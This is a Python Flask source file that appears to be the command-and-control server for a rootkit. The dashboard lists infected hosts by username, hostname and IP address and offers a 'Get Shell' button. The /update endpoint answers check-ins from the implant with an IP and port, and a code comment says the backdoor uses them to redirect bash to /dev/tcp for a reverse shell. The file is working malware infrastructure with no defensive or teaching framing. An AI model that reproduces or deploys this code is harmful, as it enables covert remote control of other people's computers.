from flask import Flask, request, redirect
import datetime
from base64 import b64decode, b64encode

DEBUG = False
SERVER_IP = "192.168.1.40"
SERVER_PORT = 12345
SHELL_IP = "192.168.1.40"#"127.0.0.1"
SHELL_PORT = 12348

app = Flask(__name__)

ClientDatas = {}

class ClientData:
    def __init__(self, username, host, ip):
        self.username = username
        self.host = host
        self.ip = ip
        self.last_time = get_time()
        self.shell_pending = False

    def update_time(self):
        self.last_time = get_time()

    def get_id(self):
        return "%s@%s@%s" % (self.username, self.host, self.ip)

    def get_row(self):
        content = "<tr>"
        for d in self.__dict__.values():
            content += "<td>%s</td>" % d
        content += """<td><form action='/shell' method='post'>
        <input type='hidden' name='id' value='%s'>
        <input type='submit' name='shell' value='Get Shell'>
        </form></td>""" % b64encode(self.get_id().encode()).decode()
        content += "</tr>"
        return content


def get_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


@app.route('/')
def hello():
    if not ClientDatas: return "<h1>There's nothing here daddy</h1>"
    content = """<html>
    <head>
    <style>
        table.blueTable {
            font-family: Arial, Helvetica, sans-serif;
            border: 1px solid #1C6EA4;
            background-color: #EEEEEE;
            width: 100%;
            text-align: center;
            border-collapse: collapse;
        }
        table.blueTable td, table.blueTable th {
            border: 1px solid #AAAAAA;
            padding: 3px 2px;
        }
        table.blueTable tbody td {
            font-size: 13px;
        }
        table.blueTable tr:nth-child(even) {
            background: #D0E4F5;
        }
        table.blueTable thead {
            background: #1C6EA4;
            background: -moz-linear-gradient(top, #5592bb 0%, #327cad 66%, #1C6EA4 100%);
            background: -webkit-linear-gradient(top, #5592bb 0%, #327cad 66%, #1C6EA4 100%);
            background: linear-gradient(to bottom, #5592bb 0%, #327cad 66%, #1C6EA4 100%);
            border-bottom: 2px solid #444444;
        }
        table.blueTable thead th {
            font-size: 15px;
            font-weight: bold;
            color: #FFFFFF;
            text-align: center;
            border-left: 2px solid #D0E4F5;
        }
        table.blueTable thead th:first-child {
            border-left: none;
        }

        table.blueTable tfoot td {
            font-size: 14px;
        }
        table.blueTable tfoot .links {
            text-align: right;
        }
        table.blueTable tfoot .links a{
            display: inline-block;
            background: #1C6EA4;
            color: #FFFFFF;
            padding: 2px 8px;
            border-radius: 5px;
        }

    </style>
    </head>
    <body>
    <h1>Welcome daddy</h1>
    <table class=blueTable><thead><tr>"""
    for key in list(ClientDatas.values())[0].__dict__.keys():
        content += "<th>%s</th>" % key.title()
    content += "<th>Shell</th>"
    content += "</tr></thead><tbody>"
    
    for c in ClientDatas.values():
        content += c.get_row()
    
    content += "</tbody></table></body></html>"
    return content

# Rootkit posts here, updates data in server and checks
# if it shoudl provide a shell
@app.route('/update', methods=["POST"])
def update():
    c = ClientData(request.form["username"], request.form["host"], request.remote_addr)
    c_id = c.get_id()
    if not c_id in ClientDatas.keys():
        ClientDatas[c_id] = c
    
    ClientDatas[c_id].update_time()
    # if shell, returns IP/PORT so backdoor script redirects bash to /dev/tcp/IP/PORT
    content = SHELL_IP + "/" + str(SHELL_PORT) if ClientDatas[c_id].shell_pending else "0"
    ClientDatas[c_id].shell_pending = False
    return content

# POST FROM WEB TO GET A SHELL
@app.route("/shell", methods=["POST"])
def shell():
    client_id = b64decode(request.form["id"].encode()).decode()
    c = ClientDatas.get(client_id)
    if not c:
        return "Invalid id"
    c.shell_pending = True
    return redirect("/")

if __name__ == '__main__':
    app.run(host=SERVER_IP, port=SERVER_PORT, debug=DEBUG)